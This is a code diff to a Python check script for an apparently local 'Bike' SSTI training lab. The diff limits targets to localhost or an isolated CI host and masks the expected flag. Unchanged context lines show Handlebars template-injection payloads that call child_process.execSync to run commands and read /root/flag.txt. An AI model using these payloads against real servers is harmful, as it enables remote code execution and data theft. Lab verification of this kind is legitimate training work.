@@ -4,6 +4,7 @@ import argparse
 import html
 import sys
 import urllib.error
+import os
 import urllib.parse
 import urllib.request
 
@@ -54,8 +55,19 @@ def main():
     parser.add_argument('--url', default='http://127.0.0.1:8080')
     args = parser.parse_args()
     base = args.url.rstrip('/')
-    if not (base.startswith('http://127.0.0.1:') or base.startswith('http://localhost:')):
-        parser.error('Only localhost URLs are accepted for this deliberately vulnerable lab')
+    parsed = urllib.parse.urlparse(base)
+    allowed_local = parsed.scheme == 'http' and parsed.hostname in {'127.0.0.1', 'localhost'}
+    allowed_internal = (
+        os.environ.get('ALLOW_INTERNAL_TARGET') == '1'
+        and parsed.scheme == 'http'
+        and parsed.hostname == 'bike-target'
+        and parsed.port == 80
+    )
+    if not (allowed_local or allowed_internal):
+        parser.error('Only localhost or the isolated bike-target:80 CI network is accepted')
+    expected_flag = os.environ.get('EXPECTED_FLAG', '')
+    if not expected_flag:
+        parser.error('EXPECTED_FLAG must contain the expected target Flag')
     passed = []
     status, body = post(base, 'student@example.invalid')
     passed.append(check('email reflected in response', status == 200 and 'student@example.invalid' in body, body))
@@ -64,7 +76,7 @@ def main():
     status, body = post(base, handlebars_rce("process.mainModule.require('child_process').execSync('id -un')"))
     passed.append(check('SSTI -> child_process -> root', status == 200 and 'root' in body, body))
     status, body = post(base, handlebars_rce("process.mainModule.require('child_process').execSync('cat /root/flag.txt')"))
-    passed.append(check('SSTI -> /root/flag.txt', status == 200 and 'HTB{local_bike_training_flag_not_the_official_flag}' in body, body))
+    passed.append(check('SSTI -> /root/flag.txt', status == 200 and expected_flag in body, body.replace(expected_flag, '[MASKED]')))
     if not all(passed):
         sys.exit(1)
     print('All Bike SSTI checks passed.')
